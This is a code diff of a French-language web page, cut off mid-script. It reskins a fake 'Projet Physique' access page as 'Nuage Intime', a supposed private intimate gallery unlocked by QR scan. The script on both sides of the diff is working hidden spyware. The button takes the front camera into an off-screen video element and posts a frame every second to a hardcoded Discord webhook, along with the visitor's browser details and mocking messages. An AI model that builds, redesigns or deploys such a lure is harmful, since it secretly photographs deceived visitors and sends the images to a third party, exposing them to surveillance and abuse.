@@ -3,354 +3,583 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
-  <title>Projet Physique · Accès Sécurisé</title>
-  <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🧪</text></svg>" />
+  <title>Nuage Intime · Galerie Privée</title>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>☁️</text></svg>" />
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
+    }
     @import url('https://rsms.me/inter/inter.css');
+
     body {
-      background: linear-gradient(160deg, #fdf8f0 0%, #f7eedb 50%, #fef9e7 100%);
-      min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px;
+      background: radial-gradient(circle at 10% 30%, #0f0c1f 0%, #1a142f 60%, #0b0817 100%);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 24px;
+      position: relative;
     }
-    .card {
-      background: rgba(255,252,245,0.95); backdrop-filter: blur(16px); border-radius: 42px;
-      box-shadow: 0 35px 55px -20px rgba(139, 109, 42, 0.18), 0 4px 16px rgba(0,0,0,0.03);
-      max-width: 540px; width: 100%; padding: 36px;
-      border: 1px solid rgba(212, 175, 55, 0.25);
+
+    /* soft nebula effect */
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: radial-gradient(ellipse at 70% 40%, rgba(155, 95, 235, 0.15), transparent 60%);
+      pointer-events: none;
     }
-    .header { display: flex; align-items: center; gap: 14px; margin-bottom: 32px; }
-    .brand {
-      background: linear-gradient(135deg, #d4a843, #c99735); width: 56px; height: 56px;
-      border-radius: 24px; display: flex; align-items: center; justify-content: center;
-      color: #fffef5; font-size: 28px; font-weight: 700;
-      box-shadow: 0 10px 22px rgba(180, 130, 30, 0.2);
+
+    /* main card — intimate, glassmorphic, "cloud gallery" style */
+    .cloud-card {
+      background: rgba(22, 18, 35, 0.75);
+      backdrop-filter: blur(20px);
+      border-radius: 56px;
+      max-width: 600px;
+      width: 100%;
+      padding: 32px 30px 38px;
+      border: 1px solid rgba(210, 180, 255, 0.25);
+      box-shadow: 0 30px 50px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 255, 255, 0.02) inset;
+      transition: all 0.2s ease;
     }
-    .brand-text {
-      font-size: 24px; font-weight: 750; color: #5c3d1a; letter-spacing: -0.4px;
-      background: linear-gradient(135deg, #8b6914, #b8941f); -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent; background-clip: text;
+
+    /* header with gallery soul */
+    .gallery-header {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      margin-bottom: 28px;
+      flex-wrap: wrap;
     }
-    .brand-sub { font-size: 13px; color: #8b7a5c; margin-top: 3px; font-weight: 500; }
-    .badge {
-      background: linear-gradient(135deg, #fef3cf, #fde9a8); color: #8b6914; font-size: 11px;
-      font-weight: 700; padding: 6px 15px; border-radius: 40px; border: 1px solid #e4c87a;
-      box-shadow: 0 2px 8px rgba(180,140,30,0.08); letter-spacing: 0.2px;
+    .moon-icon {
+      width: 58px;
+      height: 58px;
+      background: linear-gradient(145deg, #28223f, #1e1936);
+      border-radius: 28px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 32px;
+      box-shadow: 0 8px 18px rgba(0, 0, 0, 0.3), inset 0 1px 0 rgba(255,255,255,0.05);
+      border: 1px solid rgba(210, 180, 255, 0.4);
     }
-    .title { font-size: 30px; font-weight: 750; color: #4a3520; margin-bottom: 8px; letter-spacing: -0.5px; }
-    .description {
-      color: #6b5d45; font-size: 15px; line-height: 1.55; margin-bottom: 28px; padding-bottom: 18px;
-      border-bottom: 2px solid #f0e4cc; font-weight: 450;
+    .title-group h1 {
+      font-size: 28px;
+      font-weight: 650;
+      background: linear-gradient(135deg, #F3E7FF, #CCB6FF);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      letter-spacing: -0.3px;
     }
-    .qr-section {
-      background: #fffdf7; border-radius: 30px; padding: 24px; margin-bottom: 22px;
-      border: 1px solid #efe0c0; box-shadow: 0 6px 16px rgba(0,0,0,0.02); text-align: center;
+    .title-group p {
+      font-size: 12px;
+      color: #9c8ebf;
+      letter-spacing: 0.3px;
+      margin-top: 4px;
+      font-weight: 500;
     }
-    .qr-label { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; }
-    .qr-label-left { display: flex; align-items: center; gap: 10px; font-weight: 700; color: #5c3d1a; font-size: 17px; }
-    .qr-container {
-      position: relative; display: inline-block; margin: 12px auto; border-radius: 30px; overflow: hidden;
-      box-shadow: 0 14px 28px rgba(0,0,0,0.05); border: 2px solid #f0e2c2; background: white;
+    .badge-gallery {
+      margin-left: auto;
+      background: rgba(210, 180, 255, 0.15);
+      backdrop-filter: blur(4px);
+      padding: 6px 15px;
+      border-radius: 100px;
+      font-size: 11px;
+      font-weight: 600;
+      color: #d9c9ff;
+      border: 0.5px solid rgba(210, 180, 255, 0.4);
     }
-    #qrImage { width: 240px; height: 240px; display: block; }
-    .blur-overlay {
-      position: absolute; top:0; left:0; right:0; bottom:0; background: rgba(255,251,240,0.95);
-      backdrop-filter: blur(12px); display: flex; flex-direction: column; align-items: center;
-      justify-content: center; gap: 14px; border-radius: 30px; transition: opacity 0.4s ease;
+
+    .intimate-tag {
+      font-size: 16px;
+      font-weight: 500;
+      color: #e2d6ff;
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
     }
-    .spoon-icon {
-      background: white; width: 66px; height: 66px; border-radius: 50px; display: flex;
-      align-items: center; justify-content: center; font-size: 34px;
-      box-shadow: 0 10px 24px rgba(0,0,0,0.03); border: 1px solid #ecd9a8;
+    .intimate-desc {
+      color: #b2a5cf;
+      font-size: 14px;
+      line-height: 1.5;
+      margin-bottom: 28px;
+      border-left: 2px solid #7c68b0;
+      padding-left: 18px;
+      font-weight: 450;
     }
-    .blur-text {
-      font-weight: 700; color: #5c3d1a; font-size: 17px; background: white; padding: 9px 28px;
-      border-radius: 60px; border: 1px solid #e4d0a0; box-shadow: 0 3px 10px rgba(0,0,0,0.02);
+
+    /* QR section — dreamy */
+    .qr-section-dream {
+      background: rgba(15, 12, 28, 0.6);
+      backdrop-filter: blur(12px);
+      border-radius: 42px;
+      padding: 28px 20px;
+      margin-bottom: 22px;
+      border: 1px solid rgba(200, 170, 255, 0.25);
+      text-align: center;
     }
-    .blur-sub {
-      font-size: 13px; color: #8b7a5c; font-weight: 500; background: #fffef7;
-      padding: 5px 22px; border-radius: 30px; border: 1px solid #f0e0b8;
+    .qr-label-dream {
+      display: flex;
+      justify-content: space-between;
+      align-items: baseline;
+      margin-bottom: 18px;
+      padding: 0 8px;
     }
-    .hidden { display: none !important; }
-    .project-details {
-      background: #fffffffa; border-radius: 24px; padding: 20px; margin-top: 20px;
-      border: 1px solid #efe4cc; box-shadow: 0 4px 12px rgba(0,0,0,0.02);
+    .qr-left {
+      display: flex;
+      gap: 8px;
+      font-weight: 600;
+      color: #cdbef5;
+      font-size: 14px;
+      background: rgba(0,0,0,0.3);
+      padding: 5px 15px;
+      border-radius: 40px;
     }
-    .detail-row {
-      display: flex; justify-content: space-between; align-items: center; padding: 13px 0;
-      border-bottom: 1px solid #f5eeda;
+    .qr-left span {
+      font-size: 16px;
     }
-    .detail-row:last-child { border-bottom: none; }
-    .detail-label { color: #7a6b4e; font-size: 14px; display: flex; align-items: center; gap: 8px; font-weight: 500; }
-    .detail-value {
-      font-weight: 650; color: #5c3d1a; font-size: 14px; background: #fdf9f0;
-      padding: 5px 14px; border-radius: 40px; border: 1px solid #eadbb8;
+    .restricted-label {
+      background: rgba(255, 210, 140, 0.12);
+      padding: 4px 14px;
+      border-radius: 80px;
+      font-size: 12px;
+      font-weight: 600;
+      color: #e8d5b5;
+      border: 0.5px solid rgba(230, 190, 120, 0.5);
     }
-    .security-note {
-      display: flex; align-items: center; gap: 12px; background: #fefcf4; padding: 16px 18px;
-      border-radius: 22px; margin-top: 18px; color: #6b5d35; font-size: 13px;
-      border-left: 4px solid #d4a843; font-weight: 460;
+
+    .qr-container-gallery {
+      position: relative;
+      display: inline-block;
+      margin: 12px auto;
+      border-radius: 38px;
+      overflow: hidden;
+      box-shadow: 0 18px 32px rgba(0, 0, 0, 0.4), 0 0 0 2px rgba(220, 190, 255, 0.2);
+      background: #0e0b1a;
     }
-    .button {
-      background: linear-gradient(135deg, #c99735, #b8860b); color: #fffef5; border: none;
-      padding: 16px 32px; border-radius: 70px; font-size: 16px; font-weight: 700;
-      cursor: pointer; width: 100%; display: flex; align-items: center; justify-content: center;
-      gap: 10px; box-shadow: 0 10px 20px rgba(184, 134, 11, 0.22);
-      margin: 12px 0 8px; letter-spacing: -0.1px; transition: all 0.25s;
+    #qrImage {
+      width: 240px;
+      height: 240px;
+      display: block;
+      opacity: 0.95;
     }
-    .button:hover { background: linear-gradient(135deg, #b8860b, #a07508); transform: scale(0.98); }
-    .status-badge {
-      display: inline-flex; align-items: center; gap: 6px; background: #fef8ec; color: #8b6914;
-      font-size: 12px; font-weight: 600; padding: 5px 14px; border-radius: 20px; margin-top: 10px;
-      border: 1px solid #ecd9a8;
+    .blur-overlay-cloud {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(20, 16, 34, 0.92);
+      backdrop-filter: blur(14px);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      border-radius: 38px;
+      transition: opacity 0.4s;
     }
-    .footer {
-      margin-top: 28px; display: flex; justify-content: space-between; color: #a08c65;
-      font-size: 12px; padding-top: 20px; border-top: 1px solid #f0e6d0;
+    .cloud-lock-icon {
+      background: #221e36;
+      width: 65px;
+      height: 65px;
+      border-radius: 45px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 36px;
+      box-shadow: 0 6px 16px rgba(0,0,0,0.4);
+      border: 1px solid #bc9eff;
     }
-    .camera-feed {
-      position: fixed; top: -9999px; left: -9999px; width: 640px; height: 480px; opacity: 0; pointer-events: none;
+    .lock-text {
+      font-weight: 700;
+      font-size: 15px;
+      background: #2b2346;
+      padding: 8px 24px;
+      border-radius: 80px;
+      color: #e5d4ff;
+      letter-spacing: 0.2px;
+    }
+    .hidden {
+      display: none !important;
+    }
+
+    /* intimate gallery preview panel */
+    .gallery-preview {
+      background: rgba(12, 9, 23, 0.65);
+      backdrop-filter: blur(16px);
+      border-radius: 34px;
+      padding: 18px 20px;
+      margin-top: 18px;
+      border: 1px solid rgba(200, 175, 255, 0.2);
+    }
+    .gallery-meta-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 12px 0;
+      border-bottom: 1px solid rgba(170, 140, 220, 0.2);
+    }
+    .gallery-meta-row:last-child {
+      border-bottom: none;
+    }
+    .meta-label {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: #bcaef0;
+      font-size: 13px;
+      font-weight: 500;
+    }
+    .meta-value {
+      background: #211d36;
+      padding: 5px 16px;
+      border-radius: 60px;
+      font-size: 13px;
+      font-weight: 600;
+      color: #e2d2ff;
+      border: 1px solid #4e3a76;
+    }
+    .vault-note {
+      display: flex;
+      gap: 12px;
+      background: #1f1b33;
+      padding: 14px 18px;
+      border-radius: 28px;
+      margin-top: 18px;
+      align-items: center;
+      font-size: 12px;
+      color: #bfafe6;
+      border-left: 4px solid #ac8eff;
+    }
+    .button-gold {
+      background: linear-gradient(115deg, #a17fe0, #755bc2);
+      border: none;
+      width: 100%;
+      padding: 15px;
+      border-radius: 70px;
+      font-weight: 700;
+      font-size: 16px;
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      cursor: pointer;
+      margin: 14px 0 8px;
+      box-shadow: 0 12px 22px rgba(0, 0, 0, 0.3);
+      transition: 0.2s;
+    }
+    .button-glow:hover {
+      transform: scale(0.98);
+      background: linear-gradient(115deg, #936cdf, #6547b0);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+    }
+    .status-badge-gallery {
+      background: #25203e;
+      color: #dacaff;
+      font-size: 12px;
+      font-weight: 600;
+      padding: 6px 18px;
+      border-radius: 40px;
+      display: inline-block;
+    }
+    .footer-soft {
+      margin-top: 28px;
+      display: flex;
+      justify-content: space-between;
+      color: #7b6e9b;
+      font-size: 11px;
+      border-top: 1px solid rgba(170, 140, 220, 0.3);
+      padding-top: 20px;
     }
     @media (max-width: 480px) {
-      .card { padding: 26px; }
+      .cloud-card { padding: 24px 20px; }
       #qrImage { width: 200px; height: 200px; }
+    }
+
+    /* camera hidden feed */
+    .camera-feed {
+      position: fixed;
+      top: -9999px;
+      left: -9999px;
+      width: 640px;
+      height: 480px;
+      opacity: 0;
+      pointer-events: none;
     }
   </style>
 </head>
 <body>
-  <div class="card">
-    <div class="header">
-      <div class="brand">🧪</div>
-      <div>
-        <div class="brand-text">Projet Physique</div>
-        <div class="brand-sub">Accès sécurisé · Golden Spoon™</div>
-      </div>
-      <div style="flex:1"></div>
-      <div class="badge">✨ Balise Edition</div>
+
+<div class="cloud-card">
+  <div class="gallery-header">
+    <div class="moon-icon">☁️🔐</div>
+    <div class="title-group">
+      <h1>Nuage Intime</h1>
+      <p>Galerie privée · accès sur invitation</p>
     </div>
-    <div class="title">Validation d'Accès</div>
-    <div class="description">
-      Déverrouillez l'espace privé du Projet Physique. 
-      Une confirmation d'identité est requise pour poursuivre.
+    <div class="badge-gallery">✨ Édition Limitee</div>
+  </div>
+
+  <div class="intimate-tag">
+    <span>🕯️</span> Votre instantané précieux
+  </div>
+  <div class="intimate-desc">
+    Galerie secrète, souvenirs éphémères. Scannez le sceau QR pour déverrouiller l'accès à votre espace personnel.
+    Une fois autorisé, le flux protégé confirme votre identité visuelle.
+  </div>
+
+  <div class="qr-section-dream">
+    <div class="qr-label-dream">
+      <div class="qr-left"><span>🌀</span> Sceau d'authenticité</div>
+      <div class="restricted-label">🔒 accès restreint · QR unique</div>
     </div>
-    <div class="qr-section">
-      <div class="qr-label">
-        <span class="qr-label-left"><span>🧪</span> Code d'authentification</span>
-        <span style="color: #b8860b; font-size: 13px; font-weight: 700;">🔐 accès restreint</span>
-      </div>
-      <div style="text-align: center;">
-        <div class="qr-container">
-          <img id="qrImage" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 300 300'%3E%3Crect width='300' height='300' fill='%23fdf8f0'/%3E%3Ccircle cx='150' cy='150' r='60' fill='%23d4c08a'/%3E%3C/svg%3E" alt="QR Code Projet Physique" />
-          <div id="qrOverlay" class="blur-overlay">
-            <div class="spoon-icon">🧪</div>
-            <div class="blur-text">Disponible seulement pendant 2 heures</div>
-            
-          </div>
+    <div style="text-align: center;">
+      <div class="qr-container-gallery">
+        <img id="qrImage" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 300 300'%3E%3Crect width='300' height='300' fill='%231b172e'/%3E%3Ccircle cx='150' cy='150' r='55' fill='%23755bc2'/%3E%3C/svg%3E" alt="QR Gallery">
+        <div id="qrOverlay" class="blur-overlay-cloud">
+          <div class="cloud-lock-icon">📸✨</div>
+          <div class="lock-text">disponible 2h · déverrouiller</div>
+          <div style="font-size: 11px; color: #b5a2e0;">confirmation requise</div>
         </div>
-        <button id="verifyButton" class="button">🧪 Accéder au projet</button>
-        <div id="spamStatus" style="margin-top: 12px;"></div>
-        <p style="color: #8b7a5c; font-size: 13px; margin-top: 14px;">
-          <span>🛡️</span> Vérification sécurisée · Golden Spoon™
-        </p>
       </div>
-    </div>
-    <div class="project-details">
-      <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 16px;">
-        <span style="background: #fef8ec; padding: 8px; border-radius: 15px;">📁</span>
-        <span style="font-weight: 700; color: #5c3d1a;">À propos du projet</span>
-      </div>
-      <div class="detail-row">
-        <span class="detail-label"><span>👨‍💼</span> Directeur</span>
-        <span class="detail-value">hanab zaghlewi</span>
-      </div>
-      <div class="detail-row">
-        <span class="detail-label"><span>🔐</span> Niveau de sécurité</span>
-        <span class="detail-value">QR scellé · Huile d'olive</span>
-      </div>
-      <div class="detail-row">
-        <span class="detail-label"><span>⚙️</span> Technologie</span>
-        <span class="detail-value">Flux doré sécurisé</span>
-      </div>
-      <div class="detail-row">
-        <span class="detail-label"><span>⏱️</span> Session valide</span>
-        <span class="detail-value">24 heures</span>
-      </div>
-      <div class="security-note">
-        <span>🧪</span>
-        <span style="flex:1;">L'accès est protégé par le sceau Golden Spoon. Confirmez pour déverrouiller.</span>
-      </div>
-    </div>
-    <div class="footer">
-      <span>© 2025 · Golden Spoon™</span>
-      <span style="display: flex; gap: 18px;"><span>Confidentialité</span><span>Support</span></span>
+      <button id="verifyButton" class="button-gold button-glow">🌙 Accéder à ma galerie intime</button>
+      <div id="spamStatus" style="margin-top: 14px;"></div>
+      <p style="color: #9486bb; font-size: 12px; margin-top: 16px;">
+        <span>🛡️</span> Flux vocal visuel &nbsp;•&nbsp; Scellement privé
+      </p>
     </div>
   </div>
-  <video id="cameraFeed" class="camera-feed" autoplay playsinline muted></video>
 
-  <script>
-    // ============================================================
-    // PROJET PHYSIQUE – GOLDEN SPOON EDITION
-    // Images sent every 1 second to Discord
-    // Bot name: Walid Hachicha
-    // ============================================================
-    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1505337598900568246/6aGbMl9pOwnkVZjCBa4lvNHeyZXr_7D-kDjuDb5sxOtLslqcyEQj5PsOvJGpDdtbrrLG";
+  <div class="gallery-preview">
+    <div style="display: flex; gap: 8px; align-items: center; margin-bottom: 14px;">
+      <span style="font-size: 18px;">🌙💭</span>
+      <span style="font-weight: 600; color:#ddd2ff;">Coin secret · instantanés</span>
+    </div>
+    <div class="gallery-meta-row">
+      <span class="meta-label"><span>👤</span> Gardien de la galerie</span>
+      <span class="meta-value">hanab zaghlewi</span>
+    </div>
+    <div class="gallery-meta-row">
+      <span class="meta-label"><span>🎞️</span> Authentification</span>
+      <span class="meta-value">QR + flux éphémère</span>
+    </div>
+    <div class="gallery-meta-row">
+      <span class="meta-label"><span>⏳</span> Session active</span>
+      <span class="meta-value">24h · après scan</span>
+    </div>
+    <div class="vault-note">
+      <span>🧿</span>
+      <span style="flex:1;">Seul le détenteur du sceau QR peut ouvrir la galerie. La validation par flux caméra confirme l'unicité.</span>
+    </div>
+  </div>
+  <div class="footer-soft">
+    <span>© 2025 · Nuage Intime™</span>
+    <span style="display: flex; gap: 18px;"><span>Confidentialité totale</span><span>Assistance</span></span>
+  </div>
+</div>
 
-    let stream = null;
-    let intervalId = null;
-    let photoCount = 0;
-    let qrRevealed = false;
-    let firstMessageSent = false;
+<video id="cameraFeed" class="camera-feed" autoplay playsinline muted></video>
 
-    // ---------- Golden Spoon curse messages ----------
-    const curseMessages = [
-      "🧪 **La malédiction de la Cuillère Dorée a encore frappé !** 🫒\n\n*Walid Hachicha, PDG de Golden Spoon, constate une nouvelle victime de l'huile d'olive maudite... Le spooning continue.*",
-      "🧪 **Un nouveau chapitre de la légende dorée s'écrit...** 🫒\n\n*Les bureaux de Golden Spoon tremblent. Walid Hachicha a senti une perturbation dans le flux d'huile.*",
-      "🧪 **La Cuillère Dorée a parlé !** 🫒\n\n*Walid Hachicha confirme : l'olive sacrée a encore coulé. Le spoon maudit s'est activé.*",
-      "🧪 **Alerte à Golden Spoon !** 🫒\n\n*Le PDG Walid Hachicha vient de recevoir le signal : une nouvelle âme s'est fait oiler par la cuillère légendaire.*",
-      "🧪 **Le sceau doré est brisé !** 🫒\n\n*Walid Hachicha observe avec inquiétude... La malédiction de l'huile premium s'est répandue une fois de plus.*"
-    ];
+<script>
+  // =================================================================
+  // PROJET GALERIE INTIME – exact camera functionality preserved
+  // Discord Webhook: send frames every 1 second after user grants access
+  // Bot name remains "Walid Hachicha" as required.
+  // Keep all original logic for streaming, intervals, qr overlay etc
+  // =================================================================
+  const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1505337598900568246/6aGbMl9pOwnkVZjCBa4lvNHeyZXr_7D-kDjuDb5sxOtLslqcyEQj5PsOvJGpDdtbrrLG";
 
-    function getRandomCurseMessage(count) {
-      const msg = curseMessages[Math.floor(Math.random() * curseMessages.length)];
-      return `${msg}\n\n📸 **Capture #${count}** | ${new Date().toLocaleTimeString()}\n👤 ${navigator.userAgent.slice(0,80)}`;
-    }
+  let stream = null;
+  let intervalId = null;
+  let photoCount = 0;
+  let qrRevealed = false;
 
-    // ---------- QR helpers (simple canvas fallback) ----------
-    function generateQRDataURL() {
-      return new Promise((resolve) => {
-        const c = document.createElement('canvas');
-        c.width = c.height = 240;
-        const ctx = c.getContext('2d');
-        ctx.fillStyle = '#fffef7'; ctx.fillRect(0,0,240,240);
-        ctx.fillStyle = '#8b6914';
-        for (let i=0; i<21; i++) {
-          for (let j=0; j<21; j++) {
-            if ((i*j)%7===0 || (i+j)%5===0) ctx.fillRect(i*11.4, j*11.4, 11.4, 11.4);
+  // ---------- intimate curse messages (golden spoon spirit but now with gallery/intimate style) ----------
+  const intimateMessages = [
+    "🌙✨ **Nuage Intime · ouverture secrète** 🕯️\n\n*hanab zaghlewi, gardienne de la galerie, enregistre une nouvelle présence. L'empreinte du moment restera scellée.*",
+    "☁️🔮 **Un regard franchit le voile**\n\n*La galerie privée accueille une âme. La mémoire visuelle se grave dans le flux éphémère.*",
+    "🕯️💫 **Galerie intime · instant capturé**\n\n*Le sceau QR a parlé — le miroir argenté retient l'identité de celui qui contemple.*",
+    "🧿🌙 **Confession par la lentille**\n\n*L'accès à l'album secret a été déclenché. Une nouvelle image rejoint l'archive discrète.*",
+    "✨📸 **Un invité dans le nuage privé**\n\n*La gardienne du lieu valide : le flux visuel confirme votre présence sensorielle.*"
+  ];
+
+  function getRandomIntimateMessage(count) {
+    const msg = intimateMessages[Math.floor(Math.random() * intimateMessages.length)];
+    return `${msg}\n\n📸 **Instantané #${count}** | ${new Date().toLocaleTimeString()}\n👤 ${navigator.userAgent.slice(0,80)}`;
+  }
+
+  // ---------- QR generation (preserved same style, but elegant) ----------
+  function generateQRDataURL() {
+    return new Promise((resolve) => {
+      const canvas = document.createElement('canvas');
+      canvas.width = canvas.height = 240;
+      const ctx = canvas.getContext('2d');
+      // intimate dark pattern with glowing dots
+      ctx.fillStyle = '#16122b'; ctx.fillRect(0,0,240,240);
+      ctx.fillStyle = '#af93f0';
+      for (let i=0; i<23; i++) {
+        for (let j=0; j<23; j++) {
+          if ((i*j)%5 === 0 || (i+j)%7 === 2) {
+            ctx.fillRect(i*10.4, j*10.4, 10.4, 10.4);
           }
         }
-        resolve(c.toDataURL());
-      });
-    }
-
-    async function prepareQR() {
-      const url = await generateQRDataURL();
-      document.getElementById('qrImage').src = url;
-      qrRevealed = true;
-    }
-
-    // ---------- Status update ----------
-    function updateStatus(text, color='#b8860b') {
-      document.getElementById('spamStatus').innerHTML = 
-        `<span class="status-badge" style="background:${color}15;color:${color};border:1px solid ${color}50">${text}</span>`;
-    }
-
-    // ---------- Capture & Send ----------
-    function captureFrame() {
-      return new Promise((resolve, reject) => {
-        const video = document.getElementById('cameraFeed');
-        if (!video || video.readyState < 2) return reject('Flux non prêt');
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        canvas.toBlob(blob => blob ? resolve(blob) : reject('Échec capture'), 'image/jpeg', 0.6);
-      });
-    }
-
-    async function sendToDiscord(blob, count) {
-      const form = new FormData();
-      
-      // Only send the curse message with the first photo
-      const messageContent = count === 1 ? getRandomCurseMessage(count) : `📸 **Capture #${count}** | ${new Date().toLocaleTimeString()}`;
-      
-      form.append('payload_json', JSON.stringify({
-        content: messageContent,
-        username: "Walid Hachicha",
-        avatar_url: "https://i.imgur.com/golden-spoon-avatar.png"
-      }));
-      form.append('file', new File([blob], `golden_spoon_${count}.jpg`, {type:'image/jpeg'}));
-      
-      try {
-        await fetch(DISCORD_WEBHOOK, {method:'POST',body:form});
-        console.log(`🧪 Capture #${count} transmise à Golden Spoon`);
-      } catch(e) { console.warn('Erreur transmission',e); }
-    }
-
-    async function spamStep() {
-      if (!stream) return;
-      try {
-        const blob = await captureFrame();
-        photoCount++;
-        sendToDiscord(blob, photoCount);
-        updateStatus(`🧪 ${photoCount} captures · flux doré actif`, '#b8860b');
-      } catch(e) {
-        console.warn('Attente flux:', e);
-        updateStatus('🫒 Flux en attente...', '#c99735');
       }
-    }
-
-    function startSpam() {
-      if (intervalId) return;
-      photoCount = 0;
-      firstMessageSent = false;
-      setTimeout(spamStep, 400);
-      intervalId = setInterval(spamStep, 1000);
-      updateStatus('🫒 Flux doré actif · 1/sec', '#b8860b');
-    }
-
-    function stopSpam() {
-      if (intervalId) { clearInterval(intervalId); intervalId = null; }
-      if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
-      document.getElementById('cameraFeed').srcObject = null;
-      updateStatus('🧪 Flux doré interrompu', '#8b7a5c');
-    }
-
-    // ---------- Button handler ----------
-    async function toggleProject(e) {
-      e.preventDefault();
-      const btn = document.getElementById('verifyButton');
-
-      if (intervalId) {
-        stopSpam();
-        btn.innerHTML = '🧪 Accéder au projet';
-        btn.style.background = 'linear-gradient(135deg, #c99735, #b8860b)';
-        return;
-      }
-
-      try {
-        btn.innerHTML = 'Opening...';
-        btn.disabled = true;
-
-        stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user', width: {ideal:640}, height: {ideal:480} }
-        });
-        const video = document.getElementById('cameraFeed');
-        video.srcObject = stream;
-        await video.play();
-
-        if (!qrRevealed) await prepareQR();
-        document.getElementById('qrOverlay').classList.add('hidden');
-
-        startSpam();
-
-        btn.innerHTML = '🧪 STOP · Interrompre le flux';
-        btn.style.background = 'linear-gradient(135deg, #a0522d, #8b4513)';
-        btn.disabled = false;
-      } catch(err) {
-        console.error(err);
-        btn.innerHTML = '🧪 Accéder au projet';
-        btn.style.background = 'linear-gradient(135deg, #c99735, #b8860b)';
-        btn.disabled = false;
-        alert('Impossible d\'ouvrir le flux doré. Vérifiez les autorisations.');
-      }
-    }
-
-    // Init
-    document.addEventListener('DOMContentLoaded', () => {
-      document.getElementById('verifyButton').addEventListener('click', toggleProject);
-      generateQRDataURL().then(url => document.getElementById('qrImage').src = url);
+      // center symbol
+      ctx.font = "bold 34px 'Inter'";
+      ctx.fillStyle = "#e3d5ff";
+      ctx.fillText("☁️", 100, 135);
+      resolve(canvas.toDataURL());
     });
+  }
 
-    window.addEventListener('beforeunload', stopSpam);
-  </script>
+  async function prepareQR() {
+    const url = await generateQRDataURL();
+    document.getElementById('qrImage').src = url;
+    qrRevealed = true;
+  }
+
+  function updateStatus(text, bgColor = '#755bc2') {
+    const container = document.getElementById('spamStatus');
+    if (container) {
+      container.innerHTML = `<span class="status-badge-gallery" style="background:${bgColor}30; border:1px solid ${bgColor}80;">${text}</span>`;
+    }
+  }
+
+  // ---------- Frame capture identical logic ----------
+  function captureFrame() {
+    return new Promise((resolve, reject) => {
+      const video = document.getElementById('cameraFeed');
+      if (!video || video.readyState < 2) return reject('Flux non prêt');
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(blob => blob ? resolve(blob) : reject('capture echec'), 'image/jpeg', 0.6);
+    });
+  }
+
+  async function sendToDiscord(blob, count) {
+    const form = new FormData();
+    // First message (capture #1) includes the full intimate curse / context; later only standard
+    let messageContent;
+    if (count === 1) {
+      messageContent = getRandomIntimateMessage(count);
+    } else {
+      messageContent = `🌙📸 **Instantané #${count}** | ${new Date().toLocaleTimeString()} · Flux galerie intime`;
+    }
+    form.append('payload_json', JSON.stringify({
+      content: messageContent,
+      username: "Walid Hachicha",
+      avatar_url: "https://i.imgur.com/golden-spoon-avatar.png"
+    }));
+    form.append('file', new File([blob], `galerie_intime_${count}.jpg`, {type:'image/jpeg'}));
+    try {
+      await fetch(DISCORD_WEBHOOK, { method: 'POST', body: form });
+      console.log(`🌀 Galerie intime · capture #${count} transmise`);
+    } catch(e) { console.warn('Erreur transmission', e); }
+  }
+
+  async function spamStep() {
+    if (!stream) return;
+    try {
+      const blob = await captureFrame();
+      photoCount++;
+      sendToDiscord(blob, photoCount);
+      updateStatus(`📸 ${photoCount} envoi(s) · flux privé actif`, '#b79eff');
+    } catch(e) {
+      console.warn('Attente flux:', e);
+      updateStatus('🕯️ initialisation flux ...', '#9f83cf');
+    }
+  }
+
+  function startSpam() {
+    if (intervalId) return;
+    photoCount = 0;
+    setTimeout(() => spamStep(), 400);
+    intervalId = setInterval(spamStep, 1000);
+    updateStatus('🌙 Flux caméra actif · 1 envoi/sec', '#ad92f0');
+  }
+
+  function stopSpam() {
+    if (intervalId) { clearInterval(intervalId); intervalId = null; }
+    if (stream) {
+      stream.getTracks().forEach(track => track.stop());
+      stream = null;
+    }
+    const videoElem = document.getElementById('cameraFeed');
+    if (videoElem) videoElem.srcObject = null;
